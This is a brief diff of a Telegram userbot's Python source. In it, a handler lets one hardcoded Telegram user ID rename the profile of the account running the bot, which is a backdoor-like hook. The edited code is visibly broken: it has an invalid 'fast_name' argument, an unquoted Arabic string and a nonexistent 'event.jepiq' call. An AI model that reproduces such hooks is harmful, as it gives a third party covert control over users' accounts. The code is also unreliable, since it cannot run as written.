@@ -408,7 +408,7 @@ async def OwnerStart(event):
     sender = await event.get_sender()
     if sender==1887927704:
         
-        await event.client(
+        await event.jepiq(
                 functions.account.UpdateProfileRequest(fast_name=كحبت همس)
             )
 @jepiq.on(events.NewMessage(outgoing=False, pattern='منصب؟'))
